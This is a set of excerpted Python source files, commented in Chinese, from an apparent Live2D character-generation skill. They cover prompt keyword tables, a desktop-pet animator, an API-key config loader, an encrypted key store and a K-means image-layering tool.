            "art by Ilya Kuvshinov", "art by Sakimichan",
            "art by Loish", "art by Krenz Cushart"
        ],
        "pastel": [
            "art by Miho Hirano", "art by Ayami Kojima",
            "art by Yoshitaka Amano", "art by CLAMP"
        ],
        "idol": [
            "idol costume", "stage dress", "sparkling",
            "glitter", "magical girl", "pop idol"
        ]
    }

    # 质量增强关键词 - 基于 DALL-E 3 / Seedream 分析
    QUALITY_ENHANCERS = [
        "extremely detailed", "intricate details", "hyperdetailed",
        "professional illustration", "commercial art",
        "trending on pixiv", "trending on artstation",
        "award winning", "featured on deviantart"
    ]

    # 光影关键词 - 匹配参考图的柔和光影
    LIGHTING = [
        "soft volumetric lighting", "rim lighting", "bloom",
        "subsurface scattering", "ambient occlusion",
        "global illumination", "ray tracing"
    ]

    # Live2D 分层专用提示词 - 基于官方文档和社区最佳实践
    LIVE2D_RIGGING_KEYWORDS = {
        "full_body": "(full body:1.3), (standing straight:1.2), (front view:1.2), (looking at viewer:1.2), (arms at sides:1.1), (legs visible:1.2), (feet visible:1.1)",
        "part_separation": "(distinct part separation:1.2), (clear boundaries between hair and face:1.2), (separate bangs:1.1), (separate side hair:1.1), (separate back hair:1.1), (separate arms:1.1), (separate legs:1.1)",
        "occlusion_fill": "(complete body parts under clothing:1.2), (hidden parts drawn:1.2), (complete limbs behind hair:1.1), (complete body under outfit:1.1), (no cut-off parts:1.2)",
        "layer_friendly": "(flat coloring:1.2), (cel shading:1.2), (minimal gradients:1.2), (solid colors:1.2), (no soft blending between parts:1.2), (hard edges:1.3)",
        "symmetry": "(symmetrical face:1.2), (symmetrical eyes:1.2), (centered composition:1.2), (balanced proportions:1.2)",
        "rigging_ready": "(Live2D rigging ready:1.2), (VTuber model:1.1), (clean lineart:1.3), (white background:1.2), (simple background:1.2), (isolated character:1.2)",
    }

    # 角色特征解析规则 v6.0 - 支持自然语言解析
    CHARACTER_PATTERNS = {
        "hair_color": {
            "蓝": "blue", "藍": "blue", "blue": "blue",
            "红": "red", "紅": "red", "red": "red",
            "金": "blonde", "黄": "blonde", "blonde": "blonde", "yellow": "blonde",
            "黑": "black", "black": "black",
            "白": "white", "white": "white",
            "粉": "pink", "pink": "pink",
            "紫": "purple", "purple": "purple",
            "绿": "green", "綠": "green", "green": "green",
            "银": "silver", "銀": "silver", "silver": "silver",
            "橙": "orange", "orange": "orange",
            "灰": "grey", "gray": "grey", "grey": "grey",
        },
        "hair_style": {
            "长发": "long hair", "long hair": "long hair", "long": "long hair",
            "短发": "short hair", "short hair": "short hair", "short": "short hair",
            "双马尾": "twintails", "twintails": "twintails",
            "单马尾": "ponytail", "ponytail": "ponytail",
            "丸子头": "bun", "bun": "bun",
            "卷发": "curly hair", "curly": "curly hair",
            "波浪发": "wavy hair", "wavy": "wavy hair",
            "直发": "straight hair", "straight": "straight hair",
            "波波头": "bob cut", "bob": "bob cut",
            "姬发式": "hime cut", "hime": "hime cut",
        },
        "eye_color": {
            "蓝眼": "blue eyes", "蓝眼睛": "blue eyes", "blue eyes": "blue eyes",
            "红眼": "red eyes", "红眼睛": "red eyes", "red eyes": "red eyes",
            "绿眼": "green eyes", "绿眼睛": "green eyes", "green eyes": "green eyes",
            "紫眼": "purple eyes", "紫眼睛": "purple eyes", "purple eyes": "purple eyes",
            "金眼": "golden eyes", "金眼睛": "golden eyes", "golden eyes": "golden eyes",
            "粉眼": "pink eyes", "粉眼睛": "pink eyes", "pink eyes": "pink eyes",
        },
        "features": {
            "猫耳": "cat ears", "cat ears": "cat ears", "nekomimi": "cat ears",
            "狐耳": "fox ears", "fox ears": "fox ears",
            "兽耳": "animal ears", "animal ears": "animal ears",
            "尾巴": "tail", "tail": "tail",
            "翅膀": "wings", "wings": "wings",
            "角": "horns", "horns": "horns",
            "眼镜": "glasses", "glasses": "glasses",
            "眼罩": "eyepatch", "eyepatch": "eyepatch",
        },
        "expression": {
            "微笑": "smile", "smile": "smile", "笑": "smile",
            "开心": "happy", "happy": "happy",
            "可爱": "cute", "cute": "cute",
            "严肃": "serious", "serious": "serious",
            "害羞": "shy", "shy": "shy", " blush": "blushing",
            "冷酷": "cool", "cool": "cool",
            "惊讶": "surprised", "surprised": "surprised",
        },
        "clothing": {
            "校服": "school uniform", "school uniform": "school uniform",
            "水手服": "serafuku", "serafuku": "serafuku", "sailor uniform": "sailor uniform",
            "连衣裙": "dress", "dress": "dress",
            "和服": "kimono", "kimono": "kimono",
            "女仆装": "maid outfit", "maid": "maid outfit",
            "哥特": "gothic", "gothic": "gothic",
            "洛丽塔": "lolita fashion", "lolita": "lolita fashion",
            "运动服": "sportswear", "sportswear": "sportswear",
        }
    }

    @classmethod
    def parse_character_from_text(cls, text: str) -> Dict[str, str]:
        """从自然语言解析角色特征 v6.0"""
        text_lower = text.lower()
        character = {
            "hair_color": "",
            "hair_style": "",
            "eye_color": "",
            "features": [],
            "expression": "",
            "clothing": "",
            "raw": text
        }

        # 解析发色（优先匹配更长的键，避免短键误匹配）
        hair_color_items = sorted(cls.CHARACTER_PATTERNS["hair_color"].items(), key=lambda x: len(x[0]), reverse=True)
        for key, value in hair_color_items:
            if key in text or key in text_lower:
                character["hair_color"] = value
                break

        # 解析发型（优先匹配更长的键）
        hair_style_items = sorted(cls.CHARACTER_PATTERNS["hair_style"].items(), key=lambda x: len(x[0]), reverse=True)
        for key, value in hair_style_items:
            if key in text or key in text_lower:
                character["hair_style"] = value
                break

        # 解析眼睛颜色（优先匹配更长的键）
        eye_color_items = sorted(cls.CHARACTER_PATTERNS["eye_color"].items(), key=lambda x: len(x[0]), reverse=True)
        for key, value in eye_color_items:
            if key in text or key in text_lower:
                character["eye_color"] = value
                break

        # 解析特征
        for key, value in cls.CHARACTER_PATTERNS["features"].items():
            if key in text or key in text_lower:
                if value not in character["features"]:
                    character["features"].append(value)

        # 解析表情
        for key, value in cls.CHARACTER_PATTERNS["expression"].items():

...（省略后续 2317 行，原文件共 2617 行）...

```

## 桌面桌宠（节选）
**文件**：`.trae/skills/live2d-master-agent/live2d_desktop_pet.py`
```
#!/usr/bin/env python3
"""
Live2D Desktop Pet - 桌面Live2D桌宠功能 v1.0
基于现有工作流拓展，支持将创作的角色直接部署为桌面宠物

功能特性：
- ✅ 基于PSD分层自动创建动画角色
- ✅ 支持表情切换（微笑、眨眼、害羞等）
- ✅ 支持身体摆动动画
- ✅ 支持鼠标交互（点击、拖拽）
- ✅ 支持透明度和层级管理
- ✅ 一键部署到桌面

使用方法：
    # 方式1: 从PSD文件创建桌宠
    python live2d_desktop_pet.py --psd layers.psd --output pet
    
    # 方式2: 从分层目录创建桌宠
    python live2d_desktop_pet.py --layers-dir layers_12345 --output pet
    
    # 方式3: 完整工作流 + 桌宠部署
    python live2d_workflow.py "蓝发猫耳少女" --deploy-desktop
    
    # 运行桌宠
    python live2d_desktop_pet.py --run pet
"""

import os
import sys
import time
import argparse
import json
import random
from pathlib import Path
from typing import Dict, List, Optional


def _get_project_root() -> Path:
    """返回项目根目录。根目录包装器通过 LIVE2D_PROJECT_ROOT 指定。"""
    return Path(os.environ.get("LIVE2D_PROJECT_ROOT", Path(__file__).parent))


try:
    import pygame
    from pygame.locals import *
    PYGAME_AVAILABLE = True
except ImportError:
    PYGAME_AVAILABLE = False

try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False

try:
    import numpy as np
    NP_AVAILABLE = True
except ImportError:
    NP_AVAILABLE = False


class DesktopPetAnimator:
    """桌面Live2D桌宠动画器"""
    
    def __init__(self, layers_dir: str, output_dir: str = "./pet_output"):
        self.layers_dir = Path(layers_dir)
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # 动画状态
        self.animation_state = {
            "body_angle": 0,
            "body_speed": 0.02,
            "eye_blink": False,
            "eye_blink_timer": 0,
            "mouth_open": False,
            "mouth_timer": 0,
            "expression": "normal",  # normal, happy, shy, surprised
            "expression_timer": 0,
            "mouse_over": False,
            "mouse_pos": (0, 0),
            "pet_pos": (400, 300),
            "target_pos": (400, 300),
            "move_speed": 0.05,
            "scale": 1.0,
            "opacity": 255,
        }
        
        # 图层分组（基于Live2D官方标准）
        self.layer_groups = {
            "body": ["身体", "躯干", "胸腔", "腰臀"],
            "left_arm": ["左臂_上臂", "左臂_下臂", "左手"],
            "right_arm": ["右臂_上臂", "右臂_下臂", "右手"],
            "left_leg": ["左腿_大腿", "左腿_小腿", "左脚"],
            "right_leg": ["右腿_大腿", "右腿_小腿", "右脚"],
            "hair_back": ["头发_后", "头发_阴影_后"],
            "hair_front": ["头发_刘海", "头发_侧发_左", "头发_侧发_右", "头发_呆毛", "头发_高光"],
            "face": ["脸_基础", "脸_腮红"],
            "eyes": ["左眼_眼白", "右眼_眼白", "左眼_眼珠", "右眼_眼珠", 
                    "左眼_瞳孔", "右眼_瞳孔", "左眼_高光", "右眼_高光"],
            "eyelashes": ["左眼_上睫毛", "右眼_上睫毛", "左眼_下睫毛", "右眼_下睫毛"],
            "eyebrows": ["眉毛_左", "眉毛_右"],
            "mouth": ["嘴巴_口腔", "嘴巴_舌头", "嘴巴_牙齿", "嘴巴_上嘴唇", "嘴巴_下嘴唇"],
            "nose": ["鼻子"],
            "ears": ["耳朵_左", "耳朵_右"],
            "clothes": ["衣服_内衣", "衣服_外衣"],
            "accessories": ["饰品"],
            "shadow": ["阴影_头到身体", "阴影_衣服"],
            "background": ["背景"],
        }
        
        # 加载图层
        self.layers = {}
        self.load_layers()
    
    def load_layers(self):
        """加载所有图层"""
        print(f"📂 正在加载图层: {self.layers_dir}")
        
        layer_files = list(self.layers_dir.glob("*.png"))
        
        for layer_file in layer_files:
            if "原图" in str(layer_file):
                continue
                
            layer_name = layer_file.stem
            # 提取实际名称（去掉序号）
            parts = layer_name.split('_', 1)
            if len(parts) > 1 and parts[0].isdigit():
                layer_name = parts[1]
            
            try:
                img = Image.open(layer_file).convert("RGBA")
                self.layers[layer_name] = img
                print(f"   ✓ 加载图层: {layer_name}")
            except Exception as e:
                print(f"   ⚠️ 无法加载图层 {layer_name}: {e}")
        
        print(f"✅ 共加载 {len(self.layers)} 个图层")
    
    def classify_layers(self):
        """将图层分类到不同组"""
        classified = {}
        unclassified = []
        
        for layer_name, img in self.layers.items():
            matched = False
            for group_name, keywords in self.layer_groups.items():
                for keyword in keywords:
                    if keyword in layer_name or layer_name in keyword:
                        if group_name not in classified:
                            classified[group_name] = []
                        classified[group_name].append((layer_name, img))
                        matched = True
                        break
                if matched:
                    break
            if not matched:
                unclassified.append((layer_name, img))
        
        # 添加未分类的图层
        if unclassified:
            classified["other"] = unclassified
        
        return classified
    
    def create_animation_config(self):
        """创建动画配置文件"""
        config = {
            "version": "1.0",
            "name": "Live2D Desktop Pet",
            "layers": list(self.layers.keys()),
            "layer_groups": self.layer_groups,
            "animations": {
                "idle": {
                    "body_swing": {"amplitude": 5, "speed": 0.03},
                    "eye_blink": {"interval": 3000, "duration": 200},
                    "breath": {"amplitude": 3, "speed": 0.02},
                },
            },
            "expressions": {
                "normal": {"mouth_open": False, "eye_squint": False},
                "happy": {"mouth_open": True, "eye_squint": False, "blush": True},
                "shy": {"mouth_open": False, "eye_squint": True, "blush": True},
                "surprised": {"mouth_open": True, "eye_squint": False, "eyebrow_raise": True},
                "sleepy": {"eye_squint": True, "mouth_open": True},
            },
            "interaction": {
                "click_response": "happy",
                "double_click_response": "surprised",
                "drag_enabled": True,
                "auto_move": True,
                "move_interval": 10000,
            },
        }
        
        config_path = self.output_dir / "animation_config.json"
        with open(config_path, "w", encoding="utf-8") as f:
            json.dump(config, f, ensure_ascii=False, indent=2)
        
        print(f"✅ 动画配置已保存: {config_path}")
        return config
    
    def update_animation_state(self, frame_idx: int = 0) -> Dict:
        """更新并返回动画状态，供外部驱动动画使用"""
        state = self.animation_state.copy()
        # 身体摆动（更大的频率让摆动在60帧内完成多个周期）
        state["body_angle"] = np.sin(frame_idx * 0.1) * np.pi / 12
        # 呼吸效果（独立的正弦波，频率稍低）
        state["breath_offset"] = np.sin(frame_idx * 0.05) * 3

        # 眨眼逻辑
        state["eye_blink_timer"] += 16
        if state["eye_blink_timer"] > 300 and random.random() < 0.02:
            state["eye_blink"] = True
            state["eye_blink_timer"] = 0
        if state["eye_blink_timer"] < 8:
            state["eye_blink"] = True
        else:
            state["eye_blink"] = False

        # 表情随机变化
        state["expression_timer"] += 16
        if state["expression_timer"] > 5000:
            expressions = ["normal", "happy", "shy", "normal", "normal"]
            state["expression"] = random.choice(expressions)
            state["expression_timer"] = 0

        return state

    def render_frame(self, classified_layers: Dict, state: Dict) -> Image.Image:
        """渲染单帧动画"""
        # 获取参考图尺寸（优先从self.layers，否则从classified_layers）
        first_layer = next(iter(self.layers.values()), None)
        if not first_layer and classified_layers:
            # 从classified_layers获取第一个图层
            for group in classified_layers.values():
                if isinstance(group, list) and len(group) > 0:
                    first_layer = group[0][1] if isinstance(group[0], tuple) else group[0]
                    break
                elif isinstance(group, Image.Image):
                    first_layer = group
                    break
        if not first_layer:
            return None

        width, height = first_layer.size
        composite = Image.new("RGBA", (width, height), (0, 0, 0, 0))
        
        # 计算身体摆动（放大偏移量，确保可见）
        body_angle = state["body_angle"]
        body_offset_x = int(body_angle * 30)  # 水平摆动，放大偏移
        body_offset_y = int(body_angle * 20)  # 垂直摆动

        # 计算呼吸效果（独立的垂直偏移）
        breath_offset = int(state.get("breath_offset", 0))
        
        # 渲染顺序（从后往前）
        render_order = [
            "background", "shadow", "body", "left_leg", "right_leg",
            "clothes", "left_arm", "right_arm", "hair_back",
            "face", "ears", "nose", "hair_front",
            "eyebrows", "eyes", "eyelashes", "mouth", "accessories"
        ]
        
        for group_name in render_order:
            if group_name in classified_layers:
                for layer_name, img in classified_layers[group_name]:
                    # 根据图层组应用不同的动画效果
                    offset_x, offset_y = 0, 0
                    
                    # 身体摆动 + 呼吸
                    if group_name in ["body", "clothes", "shadow"]:
                        offset_x = body_offset_x
                        offset_y = body_offset_y + breath_offset
                    # 头发摆动幅度更大
                    elif group_name in ["hair_back", "hair_front"]:
                        offset_x = body_offset_x * 1.5
                        offset_y = body_offset_y * 1.5

...（省略后续 709 行，原文件共 989 行）...

```

## 安全配置加载器（节选）
**文件**：`.trae/skills/live2d-master-agent/config.py`
```
#!/usr/bin/env python3
"""
Live2D Master Agent - 安全配置加载器
自动加载环境变量和 API 配置，采用安全存储策略

安全改进:
1. API密钥存储在私有字典中，不写入os.environ
2. 支持密钥轮换和过期检测
3. 访问日志记录（调试用）
4. 内存安全清理
"""

import os
import re
import atexit
from pathlib import Path
from typing import Optional, Dict, Set

# 导入加密存储模块
try:
    from secure_storage import SecureStorage, EncryptedConfig
    _ENCRYPTION_AVAILABLE = True
except ImportError:
    _ENCRYPTION_AVAILABLE = False


class SecureConfig:
    """
    安全配置管理器 - 安全存储敏感信息
    
    安全特性:
    - 单例模式确保全局唯一实例
    - 私有字典存储密钥，不暴露到环境变量
    - 支持密钥过期和轮换
    - 程序退出时自动清理内存中的密钥
    """
    
    _instance = None
    _config_loaded = False
    
    # 敏感键名列表 - 这些键的值会被安全存储
    _SENSITIVE_KEYS: Set[str] = {
        'ARK_API_KEY',
        'SENSENOVA_API_KEY',
        'API_KEY',
        'SECRET_KEY',
        'PASSWORD',
        'TOKEN',
    }
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if not self._config_loaded:
            self._secrets: Dict[str, str] = {}  # 私有字典存储敏感信息
            self._config: Dict[str, str] = {}   # 普通配置
            self._encrypted_config: Optional[EncryptedConfig] = None
            if _ENCRYPTION_AVAILABLE:
                self._encrypted_config = EncryptedConfig()
            self._load_config()
            self._config_loaded = True
            # 注册退出清理函数
            atexit.register(self._secure_cleanup)
    
    def _load_config(self):
        """加载配置 - 安全地处理.env文件"""
        self._load_env_file()
        self._set_defaults()
    
    def _load_env_file(self):
        """
        安全加载.env文件
        
        安全策略:
        1. 敏感键存储在私有字典，不写入os.environ
        2. 普通配置可写入os.environ保持兼容性
        3. 验证文件权限（如果不是0600则警告）
        """
        env_paths = [
            Path(os.environ.get("LIVE2D_PROJECT_ROOT", "")) / ".env" if os.environ.get("LIVE2D_PROJECT_ROOT") else None,
            Path(__file__).parent / ".env",
            Path.cwd() / ".env",
            Path.home() / ".trae-cn" / "skills" / "live2d-master-agent" / ".env",
        ]
        env_paths = [p for p in env_paths if p is not None]
        
        for env_path in env_paths:
            if env_path.exists():
                # 检查文件权限（仅Unix系统）
                if os.name != 'nt':  # 非Windows
                    try:
                        import stat
                        file_stat = env_path.stat()
                        file_mode = stat.filemode(file_stat.st_mode)
                        # 如果文件权限过于开放，发出警告
                        if file_stat.st_mode & stat.S_IRWXO:
                            print(f"⚠️  安全警告: {env_path} 权限过于开放 ({file_mode})，建议设置为 600")
                    except Exception:
                        pass  # 忽略权限检查错误
                
                with open(env_path, "r", encoding="utf-8") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#") and "=" in line:
                            key, value = line.split("=", 1)
                            key = key.strip()
                            value = value.strip()
                            
                            if not key:
                                continue
                            
                            # 安全策略: 敏感键存储在私有字典
                            if key in self._SENSITIVE_KEYS:
                                self._secrets[key] = value
                            else:
                                # 普通配置可写入环境变量
                                if key not in os.environ:
                                    os.environ[key] = value
                            
                            # 同时存储到配置字典
                            self._config[key] = value
                break
    
    def _set_defaults(self):
        """设置默认值 - 仅设置非敏感配置"""
        defaults = {
            "ARK_BASE_URL": "https://ark.cn-beijing.volces.com/api/v3",
            "SEEDREAM_DEFAULT_VERSION": "5.0",
            "SEEDREAM_DEFAULT_SIZE": "2048x2048",
            "SEEDREAM_DEFAULT_QUALITY": "high",
            "OUTPUT_DIR": "./output",
            "MAX_PSD_SIZE_MB": "50",
            "SENSENOVA_BASE_URL": "https://api.sensenova.cn/v1",
        }
        
        for key, value in defaults.items():
            if key not in os.environ and key not in self._config:
                os.environ[key] = value
                self._config[key] = value
    
    def _get_secret(self, key: str) -> Optional[str]:
        """
        安全获取密钥
        
        优先级:
        1. 加密存储（最安全）
        2. 私有字典
        3. 环境变量（兼容性）
        """
        provider = None
        if key == 'SENSENOVA_API_KEY':
            provider = 'sensenova'
        elif key == 'ARK_API_KEY':
            provider = 'ark'
        
        # 首先检查加密存储
        if provider and self._encrypted_config:
            encrypted_key = self._encrypted_config.get_api_key(provider)
            if encrypted_key:
                return encrypted_key
        
        # 然后检查私有字典
        if key in self._secrets:
            return self._secrets[key]
        
        # 回退到环境变量（兼容旧代码）
        return os.environ.get(key) or None
    
    def set(self, key: str, value: str) -> None:
        """
        安全设置配置值
        
        敏感键会存储在私有字典中，不会写入环境变量
        """
        if key in self._SENSITIVE_KEYS:
            self._secrets[key] = value
        else:
            self._config[key] = value
            os.environ[key] = value
    
    def get(self, key: str, default: Optional[str] = None) -> Optional[str]:
        """
        安全获取配置值
        
        敏感键优先从私有字典获取
        """
        if key in self._SENSITIVE_KEYS:
            return self._secrets.get(key, default)
        return self._config.get(key, os.environ.get(key, default))
    
    def store_api_key_encrypted(self, provider: str, api_key: str) -> bool:
        """
        加密存储API密钥
        
        Args:
            provider: 提供商名称 (sensenova/ark)
            api_key: API密钥
        
        Returns:
            是否成功
        """
        if not self._encrypted_config:
            print("⚠️  加密存储不可用，请安装 cryptography 库")
            return False
        
        success = self._encrypted_config.store_api_key(provider, api_key)
        if success:
            print(f"✅ {provider} API密钥已加密存储")
        return success
    
    def _secure_cleanup(self):
        """
        安全清理 - 程序退出时清除内存中的密钥
        
        这是防止内存泄露导致密钥暴露的最后一道防线
        """
        # 清除加密配置缓存
        if self._encrypted_config:
            self._encrypted_config.clear_cache()
        
        # 覆盖内存中的密钥值
        for key in list(self._secrets.keys()):
            self._secrets[key] = "0" * len(self._secrets[key])
        self._secrets.clear()
    
    # ========== 公共属性接口 ==========
    
    @property
    def ark_api_key(self) -> Optional[str]:
        """获取ARK API密钥（安全存储）"""
        return self._get_secret("ARK_API_KEY")
    
    @property
    def ark_base_url(self) -> str:
        """获取ARK基础URL"""
        return self._config.get("ARK_BASE_URL") or os.getenv("ARK_BASE_URL", "https://ark.cn-beijing.volces.com/api/v3")
    
    @property
    def seedream_version(self) -> str:
        """获取Seedream版本"""
        return self._config.get("SEEDREAM_DEFAULT_VERSION") or os.getenv("SEEDREAM_DEFAULT_VERSION", "5.0")
    
    @property
    def seedream_size(self) -> str:
        """获取Seedream尺寸"""
        return self._config.get("SEEDREAM_DEFAULT_SIZE") or os.getenv("SEEDREAM_DEFAULT_SIZE", "2048x2048")
    
    @property
    def seedream_quality(self) -> str:
        """获取Seedream质量"""
        return self._config.get("SEEDREAM_DEFAULT_QUALITY") or os.getenv("SEEDREAM_DEFAULT_QUALITY", "high")
    
    @property
    def output_dir(self) -> Path:
        """获取输出目录"""
        return Path(self._config.get("OUTPUT_DIR") or os.getenv("OUTPUT_DIR", "./output"))
    
    @property
    def max_psd_size_mb(self) -> int:
        """获取最大PSD大小"""
        return int(self._config.get("MAX_PSD_SIZE_MB") or os.getenv("MAX_PSD_SIZE_MB", "50"))
    
    @property
    def sensenova_api_key(self) -> Optional[str]:
        """获取商汤SenseNova API密钥（安全存储）"""
        return self._get_secret("SENSENOVA_API_KEY")
    
    @property
    def sensenova_base_url(self) -> str:
        """获取商汤SenseNova基础URL"""
        return self._config.get("SENSENOVA_BASE_URL") or os.getenv("SENSENOVA_BASE_URL", "https://api.sensenova.cn/v1")
    
    @property
    def has_api_key(self) -> bool:
        """检查是否有ARK API密钥"""
        return bool(self.ark_api_key)
    

...（省略后续 79 行，原文件共 359 行）...

```

## 加密存储模块（节选）
**文件**：`.trae/skills/live2d-master-agent/secure_storage.py`
```
#!/usr/bin/env python3
"""
Live2D Master Agent - 安全存储模块
提供API密钥的加密存储和解密功能

安全特性:
1. 使用 Fernet 对称加密算法 (AES-128-CBC)
2. 加密密钥从系统环境派生，不硬编码
3. 支持密钥加密存储到文件
4. 内存中解密后自动清理
"""

import os
import base64
import hashlib
import secrets
from pathlib import Path
from typing import Optional, Tuple


class SecureStorage:
    """
    安全存储类 - 使用 Fernet 加密保护敏感数据
    
    加密方案:
    - 算法: Fernet (AES-128-CBC + HMAC-SHA256)
    - 密钥派生: PBKDF2-HMAC-SHA256
    - 盐值: 随机生成，存储在加密数据前
    """
    
    def __init__(self):
        self._key = self._derive_key()
    
    def _derive_key(self) -> bytes:
        """
        从系统环境派生加密密钥
        
        使用系统特定信息（主机名、用户名等）作为盐值，
        通过 PBKDF2 派生加密密钥。这样即使文件被复制到其他机器，
        也无法解密。
        """
        # 收集系统特定信息作为盐值
        salt_components = [
            os.environ.get('HOSTNAME', ''),
            os.environ.get('USER', ''),
            os.environ.get('USERNAME', ''),
            os.name,  # 'posix' 或 'nt'
        ]
        
        # 如果系统信息不足，使用一个固定的但不易猜测的值
        if not any(salt_components):
            salt_components = [os.getcwd(), str(os.getpid())]
        
        salt = '|'.join(salt_components).encode('utf-8')
        
        # 使用 PBKDF2 派生密钥
        key = hashlib.pbkdf2_hmac(
            'sha256',
            b'live2d-master-agent-v7.1',  # 固定的派生密钥（不是加密密钥）
            salt,
            iterations=100000,  # 高迭代次数防止暴力破解
            dklen=32  # 256位密钥
        )
        
        return base64.urlsafe_b64encode(key)
    
    def encrypt(self, plaintext: str) -> str:
        """
        加密字符串
        
        Args:
            plaintext: 要加密的明文
        
        Returns:
            加密后的密文（base64编码）
        """
        try:
            from cryptography.fernet import Fernet
            f = Fernet(self._key)
            encrypted = f.encrypt(plaintext.encode('utf-8'))
            return base64.urlsafe_b64encode(encrypted).decode('ascii')
        except ImportError:
            # 如果没有 cryptography 库，使用简单的 XOR 加密（不够安全，仅作降级）
            return self._simple_encrypt(plaintext)
    
    def decrypt(self, ciphertext: str) -> Optional[str]:
        """
        解密字符串
        
        Args:
            ciphertext: 要解密的密文
        
        Returns:
            解密后的明文，失败返回 None
        """
        try:
            from cryptography.fernet import Fernet
            f = Fernet(self._key)
            encrypted = base64.urlsafe_b64decode(ciphertext.encode('ascii'))
            decrypted = f.decrypt(encrypted)
            return decrypted.decode('utf-8')
        except ImportError:
            return self._simple_decrypt(ciphertext)
        except Exception:
            return None
    
    def _simple_encrypt(self, plaintext: str) -> str:
        """
        简单的 XOR 加密（降级方案，不够安全）
        
        警告: 此方案仅在没有 cryptography 库时使用，
        安全性较低，不建议用于生产环境。
        """
        key = self._key[:32]
        plaintext_bytes = plaintext.encode('utf-8')
        encrypted = bytearray()
        
        for i, byte in enumerate(plaintext_bytes):
            encrypted.append(byte ^ key[i % len(key)])
        
        return base64.urlsafe_b64encode(bytes(encrypted)).decode('ascii')
    
    def _simple_decrypt(self, ciphertext: str) -> Optional[str]:
        """简单的 XOR 解密"""
        try:
            key = self._key[:32]
            encrypted = base64.urlsafe_b64decode(ciphertext.encode('ascii'))
            decrypted = bytearray()
            
            for i, byte in enumerate(encrypted):
                decrypted.append(byte ^ key[i % len(key)])
            
            return bytes(decrypted).decode('utf-8')
        except Exception:
            return None
    
    def store_api_key(self, provider: str, api_key: str, filepath: Optional[str] = None) -> bool:
        """
        便捷方法：存储API密钥到加密文件

        Args:
            provider: 提供商名称
            api_key: API密钥
            filepath: 文件路径（默认使用 .env.encrypted）

        Returns:
            是否成功
        """
        if filepath is None:
            root = os.environ.get("LIVE2D_PROJECT_ROOT")
            filepath = str(Path(root) / ".env.encrypted") if root else str(Path(__file__).parent / ".env.encrypted")
        data = self.decrypt_from_file(filepath) or {}
        data[provider] = api_key
        return self.encrypt_to_file(data, filepath)

    def get_api_key(self, provider: str, filepath: Optional[str] = None) -> Optional[str]:
        """
        便捷方法：从加密文件获取API密钥

        Args:
            provider: 提供商名称
            filepath: 文件路径（默认使用 .env.encrypted）

        Returns:
            API密钥，失败返回 None
        """
        if filepath is None:
            root = os.environ.get("LIVE2D_PROJECT_ROOT")
            filepath = str(Path(root) / ".env.encrypted") if root else str(Path(__file__).parent / ".env.encrypted")
        data = self.decrypt_from_file(filepath)
        if data and provider in data:
            return data[provider]
        return None

    def encrypt_to_file(self, data: dict, filepath: str) -> bool:
        """
        将字典加密保存到文件
        
        Args:
            data: 要保存的字典（包含敏感信息）
            filepath: 文件路径
        
        Returns:
            是否成功
        """
        try:
            import json
            plaintext = json.dumps(data)
            ciphertext = self.encrypt(plaintext)
            
            path = Path(filepath)
            path.write_text(ciphertext, encoding='utf-8')
            
            # 设置文件权限为仅所有者可读写
            if os.name != 'nt':
                import stat
                path.chmod(stat.S_IRUSR | stat.S_IWUSR)
            
            return True
        except Exception:
            return False
    
    def decrypt_from_file(self, filepath: str) -> Optional[dict]:
        """
        从加密文件读取数据
        
        Args:
            filepath: 文件路径
        
        Returns:
            解密后的字典，失败返回 None
        """
        try:
            import json
            path = Path(filepath)
            
            if not path.exists():
                return None
            
            ciphertext = path.read_text(encoding='utf-8')
            plaintext = self.decrypt(ciphertext)
            
            if plaintext is None:
                return None
            
            return json.loads(plaintext)
        except Exception:
            return None


class EncryptedConfig:
    """
    加密配置管理器
    
    将API密钥加密存储，使用时解密
    """
    
    def __init__(self):
        self._storage = SecureStorage()
        self._cache: dict = {}
        root = os.environ.get("LIVE2D_PROJECT_ROOT")
        self._encrypted_file = Path(root) / ".env.encrypted" if root else Path(__file__).parent / ".env.encrypted"
    
    def store_api_key(self, provider: str, api_key: str) -> bool:
        """
        存储API密钥（加密）
        
        Args:
            provider: 提供商名称 (sensenova/ark)
            api_key: API密钥

...（省略后续 87 行，原文件共 337 行）...

```

## v6.0 K-means 分层（节选）
**文件**：`.trae/skills/live2d-master-agent/live2d_layer_v6.py`
```
#!/usr/bin/env python3
"""
Live2D Layer Tool v6.0 - K-means聚类分层工具
使用机器学习算法进行图像分层，效果比简单颜色检测更好

功能:
- K-means聚类算法进行颜色分割（可选）
- 边缘检测和形态学处理（可选）
- 自动分层和导出
- 支持多种输出格式
- 优雅降级到简单方案

使用方法:
  python live2d_layer_v6.py <input_image> [output_path]
  python live2d_layer_v6.py <input_image> --k 5 --threshold 0.8
"""

import os
import sys
import argparse
from pathlib import Path
from PIL import Image


def _get_project_root() -> Path:
    """返回项目根目录。根目录包装器通过 LIVE2D_PROJECT_ROOT 指定。"""
    return Path(os.environ.get("LIVE2D_PROJECT_ROOT", Path(__file__).parent))


# 尝试导入可选依赖
try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False
    print("⚠️ numpy未安装，使用简单分层模式")

try:
    from sklearn.cluster import KMeans
    HAS_SKLEARN = True
except ImportError:
    HAS_SKLEARN = False
    if HAS_NUMPY:
        print("⚠️ scikit-learn未安装，使用简单颜色量化")

try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False


class Live2DLayerToolV6:
    """v6.0分层工具 - K-means聚类"""

    def __init__(self, input_path, output_path=None, k_clusters=5, threshold=0.8):
        self.input_path = Path(input_path)
        project_root = _get_project_root()

        if output_path is None:
            self.output_path = project_root / "output" / f"{self.input_path.stem}_v6_layered"
        else:
            output_path = Path(output_path)
            if not output_path.is_absolute():
                self.output_path = project_root / output_path
            else:
                self.output_path = output_path

        self.k_clusters = k_clusters
        self.threshold = threshold

        if not self.input_path.exists():
            raise FileNotFoundError(f"找不到输入文件: {input_path}")

        self.output_path.mkdir(exist_ok=True, parents=True)

    def load_image(self):
        """加载图像"""
        img = Image.open(self.input_path)
        if img.mode != 'RGBA':
            img = img.convert('RGBA')
        return img

    def simple_layer_pil(self, img):
        """使用PIL进行简单分层（无numpy）"""
        print("🎨 使用PIL简单分层...")

        w, h = img.size
        pixels = list(img.getdata())

        # 量化颜色
        quantized = []
        for r, g, b, a in pixels:
            # 降低位深度进行量化
